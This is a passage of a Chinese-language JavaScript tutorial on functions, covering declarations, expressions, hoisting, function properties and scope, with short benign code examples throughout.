\u547d\u4ee4\u58f0\u660e\u7684\u4ee3\u7801\u533a\u5757\uff0c\u5c31\u662f\u4e00\u4e2a\u51fd\u6570\u3002 function \u547d\u4ee4\u540e\u9762\u662f\u51fd\u6570\u540d\uff0c\u51fd\u6570\u540d\u540e\u9762\u662f\u4e00\u5bf9\u5706\u62ec\u53f7\uff0c\u91cc\u9762\u662f\u4f20\u5165\u51fd\u6570\u7684\u53c2\u6570\u3002\u51fd\u6570\u4f53\u653e\u5728\u5927\u62ec\u53f7\u91cc\u9762\u3002 1 2 3 function print ( s ) { console . log ( s ); } \u4e0a\u9762\u7684\u4ee3\u7801\u547d\u540d\u4e86\u4e00\u4e2a print \u51fd\u6570\uff0c\u4ee5\u540e\u4f7f\u7528 print() \u8fd9\u79cd\u5f62\u5f0f\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528\u76f8\u5e94\u7684\u4ee3\u7801\u3002\u8fd9\u53eb\u505a\u51fd\u6570\u7684\u58f0\u660e\uff08Function Declaration\uff09\u3002 \uff082\uff09\u51fd\u6570\u8868\u8fbe\u5f0f \u9664\u4e86\u7528 function \u547d\u4ee4\u58f0\u660e\u51fd\u6570\uff0c\u8fd8\u53ef\u4ee5\u91c7\u7528\u53d8\u91cf\u8d4b\u503c\u7684\u5199\u6cd5\u3002 1 2 3 var print = function ( s ) { console . log ( s ); }; \u8fd9\u79cd\u5199\u6cd5\u5c06\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u8d4b\u503c\u7ed9\u53d8\u91cf\u3002\u8fd9\u65f6\uff0c\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u53c8\u79f0\u51fd\u6570\u8868\u8fbe\u5f0f\uff08Function Expression\uff09\uff0c\u56e0\u4e3a\u8d4b\u503c\u8bed\u53e5\u7684\u7b49\u53f7\u53f3\u4fa7\u53ea\u80fd\u653e\u8868\u8fbe\u5f0f\u3002 \u91c7\u7528\u51fd\u6570\u8868\u8fbe\u5f0f\u58f0\u660e\u51fd\u6570\u65f6\uff0c function \u547d\u4ee4\u540e\u9762\u4e0d\u5e26\u6709\u51fd\u6570\u540d\u3002\u5982\u679c\u52a0\u4e0a\u51fd\u6570\u540d\uff0c\u8be5\u51fd\u6570\u540d\u53ea\u5728\u51fd\u6570\u4f53\u5185\u90e8\u6709\u6548\uff0c\u5728\u51fd\u6570\u4f53\u5916\u90e8\u65e0\u6548\u3002 1 2 3 4 5 6 7 8 9 var print = function x (){ console . log ( typeof x ); }; x // ReferenceError: x is not defined print () // function \u4e0a\u9762\u4ee3\u7801\u5728\u51fd\u6570\u8868\u8fbe\u5f0f\u4e2d\uff0c\u52a0\u5165\u4e86\u51fd\u6570\u540d x \u3002\u8fd9\u4e2a x \u53ea\u5728\u51fd\u6570\u4f53\u5185\u90e8\u53ef\u7528\uff0c\u6307\u4ee3\u51fd\u6570\u8868\u8fbe\u5f0f\u672c\u8eab\uff0c\u5176\u4ed6\u5730\u65b9\u90fd\u4e0d\u53ef\u7528\u3002\u8fd9\u79cd\u5199\u6cd5\u7684\u7528\u5904\u6709\u4e24\u4e2a\uff0c\u4e00\u662f\u53ef\u4ee5\u5728\u51fd\u6570\u4f53\u5185\u90e8\u8c03\u7528\u81ea\u8eab\uff0c\u4e8c\u662f\u65b9\u4fbf\u9664\u9519\uff08\u9664\u9519\u5de5\u5177\u663e\u793a\u51fd\u6570\u8c03\u7528\u6808\u65f6\uff0c\u5c06\u663e\u793a\u51fd\u6570\u540d\uff0c\u800c\u4e0d\u518d\u663e\u793a\u8fd9\u91cc\u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff09\u3002\u56e0\u6b64\uff0c\u4e0b\u9762\u7684\u5f62\u5f0f\u58f0\u660e\u51fd\u6570\u4e5f\u975e\u5e38\u5e38\u89c1\u3002 1 var f = function f () {}; \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u51fd\u6570\u7684\u8868\u8fbe\u5f0f\u9700\u8981\u5728\u8bed\u53e5\u7684\u7ed3\u5c3e\u52a0\u4e0a\u5206\u53f7\uff0c\u8868\u793a\u8bed\u53e5\u7ed3\u675f\u3002\u800c\u51fd\u6570\u7684\u58f0\u660e\u5728\u7ed3\u5c3e\u7684\u5927\u62ec\u53f7\u540e\u9762\u4e0d\u7528\u52a0\u5206\u53f7\u3002\u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u4e24\u79cd\u58f0\u660e\u51fd\u6570\u7684\u65b9\u5f0f\uff0c\u5dee\u522b\u5f88\u7ec6\u5fae\uff0c\u53ef\u4ee5\u8fd1\u4f3c\u8ba4\u4e3a\u662f\u7b49\u4ef7\u7684\u3002 \uff083\uff09Function \u6784\u9020\u51fd\u6570 \u7b2c\u4e09\u79cd\u58f0\u660e\u51fd\u6570\u7684\u65b9\u5f0f\u662f Function \u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 var add = new Function ( 'x' , 'y' , 'return x + y' ); // \u7b49\u540c\u4e8e function add ( x , y ) { return x + y ; } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Function \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u9664\u4e86\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u662f add \u51fd\u6570\u7684\u201c\u51fd\u6570\u4f53\u201d\uff0c\u5176\u4ed6\u53c2\u6570\u90fd\u662f add \u51fd\u6570\u7684\u53c2\u6570\u3002 \u4f60\u53ef\u4ee5\u4f20\u9012\u4efb\u610f\u6570\u91cf\u7684\u53c2\u6570\u7ed9 Function \u6784\u9020\u51fd\u6570\uff0c\u53ea\u6709\u6700\u540e\u4e00\u4e2a\u53c2\u6570\u4f1a\u88ab\u5f53\u505a\u51fd\u6570\u4f53\uff0c\u5982\u679c\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\uff0c\u8be5\u53c2\u6570\u5c31\u662f\u51fd\u6570\u4f53\u3002 1 2 3 4 5 6 7 8 var foo = new Function ( 'return \"hello world\";' ); // \u7b49\u540c\u4e8e function foo () { return 'hello world' ; } Function \u6784\u9020\u51fd\u6570\u53ef\u4ee5\u4e0d\u4f7f\u7528 new \u547d\u4ee4\uff0c\u8fd4\u56de\u7ed3\u679c\u5b8c\u5168\u4e00\u6837\u3002 \u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u79cd\u58f0\u660e\u51fd\u6570\u7684\u65b9\u5f0f\u975e\u5e38\u4e0d\u76f4\u89c2\uff0c\u51e0\u4e4e\u65e0\u4eba\u4f7f\u7528\u3002 \u51fd\u6570\u7684\u91cd\u590d\u58f0\u660e \u00b6 \u5982\u679c\u540c\u4e00\u4e2a\u51fd\u6570\u88ab\u591a\u6b21\u58f0\u660e\uff0c\u540e\u9762\u7684\u58f0\u660e\u5c31\u4f1a\u8986\u76d6\u524d\u9762\u7684\u58f0\u660e\u3002 1 2 3 4 5 6 7 8 9 function f () { console . log ( 1 ); } f () // 2 function f () { console . log ( 2 ); } f () // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u540e\u4e00\u6b21\u7684\u51fd\u6570\u58f0\u660e\u8986\u76d6\u4e86\u524d\u9762\u4e00\u6b21\u3002\u800c\u4e14\uff0c\u7531\u4e8e\u51fd\u6570\u540d\u7684\u63d0\u5347\uff08\u53c2\u89c1\u4e0b\u6587\uff09\uff0c\u524d\u4e00\u6b21\u58f0\u660e\u5728\u4efb\u4f55\u65f6\u5019\u90fd\u662f\u65e0\u6548\u7684\uff0c\u8fd9\u4e00\u70b9\u8981\u7279\u522b\u6ce8\u610f\u3002 \u5706\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0creturn \u8bed\u53e5\u548c\u9012\u5f52 \u00b6 \u8c03\u7528\u51fd\u6570\u65f6\uff0c\u8981\u4f7f\u7528\u5706\u62ec\u53f7\u8fd0\u7b97\u7b26\u3002\u5706\u62ec\u53f7\u4e4b\u4e2d\uff0c\u53ef\u4ee5\u52a0\u5165\u51fd\u6570\u7684\u53c2\u6570\u3002 1 2 3 4 5 function add ( x , y ) { return x + y ; } add ( 1 , 1 ) // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570\u540d\u540e\u9762\u7d27\u8ddf\u4e00\u5bf9\u5706\u62ec\u53f7\uff0c\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u3002 \u51fd\u6570\u4f53\u5185\u90e8\u7684 return \u8bed\u53e5\uff0c\u8868\u793a\u8fd4\u56de\u3002JavaScript \u5f15\u64ce\u9047\u5230 return \u8bed\u53e5\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de return \u540e\u9762\u7684\u90a3\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u540e\u9762\u5373\u4f7f\u8fd8\u6709\u8bed\u53e5\uff0c\u4e5f\u4e0d\u4f1a\u5f97\u5230\u6267\u884c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c return \u8bed\u53e5\u6240\u5e26\u7684\u90a3\u4e2a\u8868\u8fbe\u5f0f\uff0c\u5c31\u662f\u51fd\u6570\u7684\u8fd4\u56de\u503c\u3002 return \u8bed\u53e5\u4e0d\u662f\u5fc5\u9700\u7684\uff0c\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u8be5\u51fd\u6570\u5c31\u4e0d\u8fd4\u56de\u4efb\u4f55\u503c\uff0c\u6216\u8005\u8bf4\u8fd4\u56de undefined \u3002 \u51fd\u6570\u53ef\u4ee5\u8c03\u7528\u81ea\u8eab\uff0c\u8fd9\u5c31\u662f\u9012\u5f52\uff08recursion\uff09\u3002\u4e0b\u9762\u5c31\u662f\u901a\u8fc7\u9012\u5f52\uff0c\u8ba1\u7b97\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684\u4ee3\u7801\u3002 1 2 3 4 5 6 7 function fib ( num ) { if ( num === 0 ) return 0 ; if ( num === 1 ) return 1 ; return fib ( num - 2 ) + fib ( num - 1 ); } fib ( 6 ) // 8 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c fib \u51fd\u6570\u5185\u90e8\u53c8\u8c03\u7528\u4e86 fib \uff0c\u8ba1\u7b97\u5f97\u5230\u6590\u6ce2\u90a3\u5951\u6570\u5217\u7684\u7b2c6\u4e2a\u5143\u7d20\u662f8\u3002 \u7b2c\u4e00\u7b49\u516c\u6c11 \u00b6 JavaScript \u8bed\u8a00\u5c06\u51fd\u6570\u770b\u4f5c\u4e00\u79cd\u503c\uff0c\u4e0e\u5176\u5b83\u503c\uff08\u6570\u503c\u3001\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u7b49\u7b49\uff09\u5730\u4f4d\u76f8\u540c\u3002\u51e1\u662f\u53ef\u4ee5\u4f7f\u7528\u503c\u7684\u5730\u65b9\uff0c\u5c31\u80fd\u4f7f\u7528\u51fd\u6570\u3002\u6bd4\u5982\uff0c\u53ef\u4ee5\u628a\u51fd\u6570\u8d4b\u503c\u7ed9\u53d8\u91cf\u548c\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u4e5f\u53ef\u4ee5\u5f53\u4f5c\u53c2\u6570\u4f20\u5165\u5176\u4ed6\u51fd\u6570\uff0c\u6216\u8005\u4f5c\u4e3a\u51fd\u6570\u7684\u7ed3\u679c\u8fd4\u56de\u3002\u51fd\u6570\u53ea\u662f\u4e00\u4e2a\u53ef\u4ee5\u6267\u884c\u7684\u503c\uff0c\u6b64\u5916\u5e76\u65e0\u7279\u6b8a\u4e4b\u5904\u3002 \u7531\u4e8e\u51fd\u6570\u4e0e\u5176\u4ed6\u6570\u636e\u7c7b\u578b\u5730\u4f4d\u5e73\u7b49\uff0c\u6240\u4ee5\u5728 JavaScript \u8bed\u8a00\u4e2d\u53c8\u79f0\u51fd\u6570\u4e3a\u7b2c\u4e00\u7b49\u516c\u6c11\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 function add ( x , y ) { return x + y ; } // \u5c06\u51fd\u6570\u8d4b\u503c\u7ed9\u4e00\u4e2a\u53d8\u91cf var operator = add ; // \u5c06\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u548c\u8fd4\u56de\u503c function a ( op ){ return op ; } a ( add )( 1 , 1 ) // 2 \u51fd\u6570\u540d\u7684\u63d0\u5347 \u00b6 JavaScript \u5f15\u64ce\u5c06\u51fd\u6570\u540d\u89c6\u540c\u53d8\u91cf\u540d\uff0c\u6240\u4ee5\u91c7\u7528 function \u547d\u4ee4\u58f0\u660e\u51fd\u6570\u65f6\uff0c\u6574\u4e2a\u51fd\u6570\u4f1a\u50cf\u53d8\u91cf\u58f0\u660e\u4e00\u6837\uff0c\u88ab\u63d0\u5347\u5230\u4ee3\u7801\u5934\u90e8\u3002\u6240\u4ee5\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u62a5\u9519\u3002 1 2 3 f (); function f () {} \u8868\u9762\u4e0a\uff0c\u4e0a\u9762\u4ee3\u7801\u597d\u50cf\u5728\u58f0\u660e\u4e4b\u524d\u5c31\u8c03\u7528\u4e86\u51fd\u6570 f \u3002\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u7531\u4e8e\u201c\u53d8\u91cf\u63d0\u5347\u201d\uff0c\u51fd\u6570 f \u88ab\u63d0\u5347\u5230\u4e86\u4ee3\u7801\u5934\u90e8\uff0c\u4e5f\u5c31\u662f\u5728\u8c03\u7528\u4e4b\u524d\u5df2\u7ecf\u58f0\u660e\u4e86\u3002\u4f46\u662f\uff0c\u5982\u679c\u91c7\u7528\u8d4b\u503c\u8bed\u53e5\u5b9a\u4e49\u51fd\u6570\uff0cJavaScript \u5c31\u4f1a\u62a5\u9519\u3002 1 2 3 f (); var f = function (){}; // TypeError: undefined is not a function \u4e0a\u9762\u7684\u4ee3\u7801\u7b49\u540c\u4e8e\u4e0b\u9762\u7684\u5f62\u5f0f\u3002 1 2 3 var f ; f (); f = function () {}; \u4e0a\u9762\u4ee3\u7801\u7b2c\u4e8c\u884c\uff0c\u8c03\u7528 f \u7684\u65f6\u5019\uff0c f \u53ea\u662f\u88ab\u58f0\u660e\u4e86\uff0c\u8fd8\u6ca1\u6709\u88ab\u8d4b\u503c\uff0c\u7b49\u4e8e undefined \uff0c\u6240\u4ee5\u4f1a\u62a5\u9519\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u50cf\u4e0b\u9762\u4f8b\u5b50\u90a3\u6837\uff0c\u91c7\u7528 function \u547d\u4ee4\u548c var \u8d4b\u503c\u8bed\u53e5\u58f0\u660e\u540c\u4e00\u4e2a\u51fd\u6570\uff0c\u7531\u4e8e\u5b58\u5728\u51fd\u6570\u63d0\u5347\uff0c\u6700\u540e\u4f1a\u91c7\u7528 var \u8d4b\u503c\u8bed\u53e5\u7684\u5b9a\u4e49\u3002 1 2 3 4 5 6 7 8 9 var f = function () { console . log ( '1' ); } function f () { console . log ( '2' ); } f () // 1 \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c\u8868\u9762\u4e0a\u540e\u9762\u58f0\u660e\u7684\u51fd\u6570 f \uff0c\u5e94\u8be5\u8986\u76d6\u524d\u9762\u7684 var \u8d4b\u503c\u8bed\u53e5\uff0c\u4f46\u662f\u7531\u4e8e\u5b58\u5728\u51fd\u6570\u63d0\u5347\uff0c\u5b9e\u9645\u4e0a\u6b63\u597d\u53cd\u8fc7\u6765\u3002 \u51fd\u6570\u7684\u5c5e\u6027\u548c\u65b9\u6cd5 \u00b6 name \u5c5e\u6027 \u00b6 \u51fd\u6570\u7684 name \u5c5e\u6027\u8fd4\u56de\u51fd\u6570\u7684\u540d\u5b57\u3002 1 2 function f1 () {} f1 . name // \"f1\" \u5982\u679c\u662f\u901a\u8fc7\u53d8\u91cf\u8d4b\u503c\u5b9a\u4e49\u7684\u51fd\u6570\uff0c\u90a3\u4e48 name \u5c5e\u6027\u8fd4\u56de\u53d8\u91cf\u540d\u3002 1 2 var f2 = function () {}; f2 . name // \"f2\" \u4f46\u662f\uff0c\u4e0a\u9762\u8fd9\u79cd\u60c5\u51b5\uff0c\u53ea\u6709\u5728\u53d8\u91cf\u7684\u503c\u662f\u4e00\u4e2a\u533f\u540d\u51fd\u6570\u65f6\u624d\u662f\u5982\u6b64\u3002\u5982\u679c\u53d8\u91cf\u7684\u503c\u662f\u4e00\u4e2a\u5177\u540d\u51fd\u6570\uff0c\u90a3\u4e48 name \u5c5e\u6027\u8fd4\u56de function \u5173\u952e\u5b57\u4e4b\u540e\u7684\u90a3\u4e2a\u51fd\u6570\u540d\u3002 1 2 var f3 = function myName () {}; f3 . name // 'myName' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c f3.name \u8fd4\u56de\u51fd\u6570\u8868\u8fbe\u5f0f\u7684\u540d\u5b57\u3002\u6ce8\u610f\uff0c\u771f\u6b63\u7684\u51fd\u6570\u540d\u8fd8\u662f f3 \uff0c\u800c myName \u8fd9\u4e2a\u540d\u5b57\u53ea\u5728\u51fd\u6570\u4f53\u5185\u90e8\u53ef\u7528\u3002 name \u5c5e\u6027\u7684\u4e00\u4e2a\u7528\u5904\uff0c\u5c31\u662f\u83b7\u53d6\u53c2\u6570\u51fd\u6570\u7684\u540d\u5b57\u3002 1 2 3 4 5 6 7 var myFunc = function () {}; function test ( f ) { console . log ( f . name ); } test ( myFunc ) // myFunc \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 test \u5185\u90e8\u901a\u8fc7 name \u5c5e\u6027\uff0c\u5c31\u53ef\u4ee5\u77e5\u9053\u4f20\u5165\u7684\u53c2\u6570\u662f\u4ec0\u4e48\u51fd\u6570\u3002 length \u5c5e\u6027 \u00b6 \u51fd\u6570\u7684 length \u5c5e\u6027\u8fd4\u56de\u51fd\u6570\u9884\u671f\u4f20\u5165\u7684\u53c2\u6570\u4e2a\u6570\uff0c\u5373\u51fd\u6570\u5b9a\u4e49\u4e4b\u4e2d\u7684\u53c2\u6570\u4e2a\u6570\u3002 1 2 function f ( a , b ) {} f . length // 2 \u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u7a7a\u51fd\u6570 f \uff0c\u5b83\u7684 length \u5c5e\u6027\u5c31\u662f\u5b9a\u4e49\u65f6\u7684\u53c2\u6570\u4e2a\u6570\u3002\u4e0d\u7ba1\u8c03\u7528\u65f6\u8f93\u5165\u4e86\u591a\u5c11\u4e2a\u53c2\u6570\uff0c length \u5c5e\u6027\u59cb\u7ec8\u7b49\u4e8e2\u3002 length \u5c5e\u6027\u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u5224\u65ad\u5b9a\u4e49\u65f6\u548c\u8c03\u7528\u65f6\u53c2\u6570\u7684\u5dee\u5f02\uff0c\u4ee5\u4fbf\u5b9e\u73b0\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u7684\u201c\u65b9\u6cd5\u91cd\u8f7d\u201d\uff08overload\uff09\u3002 toString() \u00b6 \u51fd\u6570\u7684 toString() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5185\u5bb9\u662f\u51fd\u6570\u7684\u6e90\u7801\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function f () { a (); b (); c (); } f . toString () // function f() { // a(); // b(); // c(); // } \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u51fd\u6570 f \u7684 toString() \u65b9\u6cd5\u8fd4\u56de\u4e86 f \u7684\u6e90\u7801\uff0c\u5305\u542b\u6362\u884c\u7b26\u5728\u5185\u3002 \u5bf9\u4e8e\u90a3\u4e9b\u539f\u751f\u7684\u51fd\u6570\uff0c toString() \u65b9\u6cd5\u8fd4\u56de function (){[native code]} \u3002 1 2 Math . sqrt . toString () // \"function sqrt() { [native code] }\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c Math.sqrt() \u662f JavaScript \u5f15\u64ce\u63d0\u4f9b\u7684\u539f\u751f\u51fd\u6570\uff0c toString() \u65b9\u6cd5\u5c31\u8fd4\u56de\u539f\u751f\u4ee3\u7801\u7684\u63d0\u793a\u3002 \u51fd\u6570\u5185\u90e8\u7684\u6ce8\u91ca\u4e5f\u53ef\u4ee5\u8fd4\u56de\u3002 1 2 3 4 5 6 7 8 9 10 function f () { /* \u8fd9\u662f\u4e00\u4e2a \u591a\u884c\u6ce8\u91ca */ } f . toString () // \"function f(){/* // \u8fd9\u662f\u4e00\u4e2a // \u591a\u884c\u6ce8\u91ca // */}\" \u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u53ef\u4ee5\u53d8\u76f8\u5b9e\u73b0\u591a\u884c\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var multiline = function ( fn ) { var arr = fn . toString (). split ( '\\n' ); return arr . slice ( 1 , arr . length - 1 ). join ( '\\n' ); }; function f () { /* \u8fd9\u662f\u4e00\u4e2a \u591a\u884c\u6ce8\u91ca */ } multiline ( f ); // \" \u8fd9\u662f\u4e00\u4e2a // \u591a\u884c\u6ce8\u91ca\" \u4e0a\u9762\u793a\u4f8b\u4e2d\uff0c\u51fd\u6570 f \u5185\u90e8\u6709\u4e00\u4e2a\u591a\u884c\u6ce8\u91ca\uff0c toString() \u65b9\u6cd5\u62ff\u5230 f \u7684\u6e90\u7801\u540e\uff0c\u53bb\u6389\u9996\u5c3e\u4e24\u884c\uff0c\u5c31\u5f97\u5230\u4e86\u4e00\u4e2a\u591a\u884c\u5b57\u7b26\u4e32\u3002 \u51fd\u6570\u4f5c\u7528\u57df \u00b6 \u5b9a\u4e49 \u00b6 \u4f5c\u7528\u57df\uff08scope\uff09\u6307\u7684\u662f\u53d8\u91cf\u5b58\u5728\u7684\u8303\u56f4\u3002\u5728 ES5 \u7684\u89c4\u8303\u4e2d\uff0cJavaScript \u53ea\u6709\u4e24\u79cd\u4f5c\u7528\u57df\uff1a\u4e00\u79cd\u662f\u5168\u5c40\u4f5c\u7528\u57df\uff0c\u53d8\u91cf\u5728\u6574\u4e2a\u7a0b\u5e8f\u4e2d\u4e00\u76f4\u5b58\u5728\uff0c\u6240\u6709\u5730\u65b9\u90fd\u53ef\u4ee5\u8bfb\u53d6\uff1b\u53e6\u4e00\u79cd\u662f\u51fd\u6570\u4f5c\u7528\u57df\uff0c\u53d8\u91cf\u53ea\u5728\u51fd\u6570\u5185\u90e8\u5b58\u5728\u3002ES6 \u53c8\u65b0\u589e\u4e86\u5757\u7ea7\u4f5c\u7528\u57df\uff0c\u672c\u6559\u7a0b\u4e0d\u6d89\u53ca\u3002 \u5bf9\u4e8e\u9876\u5c42\u51fd\u6570\u6765\u8bf4\uff0c\u51fd\u6570\u5916\u90e8\u58f0\u660e\u7684\u53d8\u91cf\u5c31\u662f\u5168\u5c40\u53d8\u91cf\uff08global variable\uff09\uff0c\u5b83\u53ef\u4ee5\u5728\u51fd\u6570\u5185\u90e8\u8bfb\u53d6\u3002 1 2 3 4 5 6 7 8 var v = 1 ; function f () { console . log ( v ); } f () // 1 \u4e0a\u9762\u7684\u4ee3\u7801\u8868\u660e\uff0c\u51fd\u6570 f \u5185\u90e8\u53ef\u4ee5\u8bfb\u53d6\u5168\u5c40\u53d8\u91cf v \u3002 \u5728\u51fd\u6570\u5185\u90e8\u5b9a\u4e49\u7684\u53d8\u91cf\uff0c\u5916\u90e8\u65e0\u6cd5\u8bfb\u53d6\uff0c\u79f0\u4e3a\u201c\u5c40\u90e8\u53d8\u91cf\u201d\uff08local variable\uff09\u3002 1 2 3 4 5 function f (){ var v = 1 ; } v // ReferenceError: v is not defined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf v \u5728\u51fd\u6570\u5185\u90e8\u5b9a\u4e49\uff0c\u6240\u4ee5\u662f\u4e00\u4e2a\u5c40\u90e8\u53d8\u91cf\uff0c\u51fd\u6570\u4e4b\u5916\u5c31\u65e0\u6cd5\u8bfb\u53d6\u3002 \u51fd\u6570\u5185\u90e8\u5b9a\u4e49\u7684\u53d8\u91cf\uff0c\u4f1a\u5728\u8be5\u4f5c\u7528\u57df\u5185\u8986\u76d6\u540c\u540d\u5168\u5c40\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 var v = 1 ; function f (){ var v = 2 ; console . log ( v ); } f () // 2 v // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf v \u540c\u65f6\u5728\u51fd\u6570\u7684\u5916\u90e8\u548c\u5185\u90e8\u6709\u5b9a\u4e49\u3002\u7ed3\u679c\uff0c\u5728\u51fd\u6570\u5185\u90e8\u5b9a\u4e49\uff0c\u5c40\u90e8\u53d8\u91cf v \u8986\u76d6\u4e86\u5168\u5c40\u53d8\u91cf v \u3002 \u6ce8\u610f\uff0c\u5bf9\u4e8e var \u547d\u4ee4\u6765\u8bf4\uff0c\u5c40\u90e8\u53d8\u91cf\u53ea\u80fd\u5728\u51fd\u6570\u5185\u90e8\u58f0\u660e\uff0c\u5728\u5176\u4ed6\u533a\u5757\u4e2d\u58f0\u660e\uff0c\u4e00\u5f8b\u90fd\u662f\u5168\u5c40\u53d8\u91cf\u3002 1 2 3 4 if ( true ) { var x = 5 ; } console . log ( x ); // 5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf x \u5728\u6761\u4ef6\u5224\u65ad\u533a\u5757\u4e4b\u4e2d\u58f0\u660e\uff0c\u7ed3\u679c\u5c31\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u53ef\u4ee5\u5728\u533a\u5757\u4e4b\u5916\u8bfb\u53d6\u3002 \u51fd\u6570\u5185\u90e8\u7684\u53d8\u91cf\u63d0\u5347 \u00b6 \u4e0e\u5168\u5c40\u4f5c\u7528\u57df\u4e00\u6837\uff0c\u51fd\u6570\u4f5c\u7528\u57df\u5185\u90e8\u4e5f\u4f1a\u4ea7\u751f\u201c\u53d8\u91cf\u63d0\u5347\u201d\u73b0\u8c61\u3002 var \u547d\u4ee4\u58f0\u660e\u7684\u53d8\u91cf\uff0c\u4e0d\u7ba1\u5728\u4ec0\u4e48\u4f4d\u7f6e\uff0c\u53d8\u91cf\u58f0\u660e\u90fd\u4f1a\u88ab\u63d0\u5347\u5230\u51fd\u6570\u4f53\u7684\u5934\u90e8\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 function foo ( x ) { if ( x > 100 ) { var tmp = x - 100 ; } } // \u7b49\u540c\u4e8e function foo ( x ) { var tmp ; if ( x > 100 ) { tmp = x - 100 ; }; } \u51fd\u6570\u672c\u8eab\u7684\u4f5c\u7528\u57df \u00b6 \u51fd\u6570\u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u503c\uff0c\u4e5f\u6709\u81ea\u5df1\u7684\u4f5c\u7528\u57df\u3002\u5b83\u7684\u4f5c\u7528\u57df\u4e0e\u53d8\u91cf\u4e00\u6837\uff0c\u5c31\u662f\u5176\u58f0\u660e\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\uff0c\u4e0e\u5176\u8fd0\u884c\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\u65e0\u5173\u3002 1 2 3 4 5 6 7 8 9 10 11 var a = 1 ; var x = function () { console . log ( a ); }; function f () { var a = 2 ; x (); } f () // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570 x \u662f\u5728\u51fd\u6570 f \u7684\u5916\u90e8\u58f0\u660e\u7684\uff0c\u6240\u4ee5\u5b83\u7684\u4f5c\u7528\u57df\u7ed1\u5b9a\u5916\u5c42\uff0c\u5185\u90e8\u53d8\u91cf a \u4e0d\u4f1a\u5230\u51fd\u6570 f \u4f53\u5185\u53d6\u503c\uff0c\u6240\u4ee5\u8f93\u51fa 1 \uff0c\u800c\u4e0d\u662f 2 \u3002 \u603b\u4e4b\uff0c\u51fd\u6570\u6267\u884c\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\uff0c\u662f\u5b9a\u4e49\u65f6\u7684\u4f5c\u7528\u57df\uff0c\u800c\u4e0d\u662f\u8c03\u7528\u65f6\u6240\u5728\u7684\u4f5c\u7528\u57df\u3002 \u5f88\u5bb9\u6613\u72af\u9519\u7684\u4e00\u70b9\u662f\uff0c\u5982\u679c\u51fd\u6570 A \u8c03\u7528\u51fd\u6570 B \uff0c\u5374\u6ca1\u8003\u8651\u5230\u51fd\u6570 B \u4e0d\u4f1a\u5f15\u7528\u51fd\u6570 A \u7684\u5185\u90e8\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 9 10 11 var x = function () { console . log ( a ); }; function y ( f ) { var a = 2 ; f (); } y ( x ) // ReferenceError: a is not defined \u4e0a\u9762\u4ee3\u7801\u5c06\u51fd\u6570 x \u4f5c\u4e3a\u53c2\u6570\uff0c\u4f20\u5165\u51fd\u6570 y \u3002\u4f46\u662f\uff0c\u51fd\u6570 x \u662f\u5728\u51fd\u6570 y \u4f53\u5916\u58f0\u660e\u7684\uff0c\u4f5c\u7528\u57df\u7ed1\u5b9a\u5916\u5c42\uff0c\u56e0\u6b64\u627e\u4e0d\u5230\u51fd\u6570 y \u7684\u5185\u90e8\u53d8\u91cf a \uff0c\u5bfc\u81f4\u62a5\u9519\u3002 \u540c\u6837\u7684\uff0c\u51fd\u6570\u4f53\u5185\u90e8\u58f0\u660e\u7684\u51fd\u6570\uff0c\u4f5c\u7528\u57df\u7ed1\u5b9a\u51fd\u6570\u4f53\u5185\u90e8\u3002 1 2 3 4 5 6 7 8 9 10 11 function foo () { var x = 1 ; function bar () { console . log ( x ); } return bar ; } var x = 2 ; var f = foo (); f () // 1 